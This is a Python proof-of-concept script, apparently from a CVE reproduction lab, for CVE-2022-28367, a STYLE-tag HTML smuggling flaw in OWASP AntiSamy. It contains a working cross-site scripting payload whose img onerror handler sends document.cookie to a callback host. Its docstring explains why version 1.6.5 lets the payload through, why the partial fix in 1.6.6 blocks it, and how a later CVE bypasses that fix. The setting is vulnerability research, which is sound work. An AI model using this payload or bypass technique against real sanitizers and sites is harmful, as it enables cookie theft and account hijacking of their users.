#!/usr/bin/env python3
"""[GIVEN] CVE-2022-28367 seed -- STYLE-tag HTML smuggling in OWASP AntiSamy.

Vector: crafted input that AntiSamy's neko HTML parser turns into a `<style>` element carrying a
SINGLE smuggled child node (a live element rather than CSS text). On V0 (AntiSamy 1.6.5)
processStyleTag() scans only `firstChild` as CSS and LEAVES the smuggled child untouched, so it is
serialized RAW into the output; the browser then executes it (its onerror/handler reads
document.cookie and exfiltrates the flag to the internal callback). That is the smuggling.

On V1 (AntiSamy 1.6.6, the CVE-2022-28367 PARTIAL fix = TARGET) processStyleTag() concatenates all
child text, scans it as CSS, and then RUNS A CHILD-REMOVAL LOOP that removes the (single) extra child
node -> the smuggled element is gone -> inert -> BLOCKED (no flag).

This is the guard that CVE-2022-29577 later bypasses with MULTIPLE smuggled child nodes (the forward
removal loop over a live NodeList skips nodes).
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from poc_common import run_payload, CB  # noqa: E402

# Finalized empirically against the running containers (see repro.log). ONE smuggled child node:
# the `<![cdata[` bogus-comment keeps `</style><img onerror>` as RAW TEXT (preserving both the
# `</style>` breakout and the onerror handler). As a SINGLE extra child (child index 1) the AntiSamy
# 1.6.6 removal loop deletes it -> BLOCKED on V1; V0 (no loop) leaves it raw -> the browser closes
# <style> at the smuggled </style> and the live <img onerror> fires on load -> flag exfiltrated.
ORIGINAL_PAYLOAD = (
    "<style/>b<![cdata[</style>"
    "<img src=x onerror=\"document.location='" + CB + "'+document.cookie\">"
)


def original_poc(*, version="v1"):
    """Run the CVE1 single-node smuggling seed on `version` (view/load); return the callback dump."""
    return run_payload(ORIGINAL_PAYLOAD, version, mode="load")


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(original_poc(version=v))
